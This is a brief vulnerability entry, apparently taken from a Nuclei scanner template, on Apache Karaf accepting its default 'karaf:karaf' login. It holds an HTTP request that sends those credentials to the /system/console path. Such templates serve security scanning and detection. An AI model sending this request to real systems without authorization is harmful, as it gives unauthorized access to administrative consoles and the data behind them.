# Vulnerability: Apache Karaf - Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`karaf-default-login.yaml`)

## Description
Apache Karaf contains a default login vulnerability. Default login credentials were detected. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /system/console HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64('karaf:karaf')}}
```

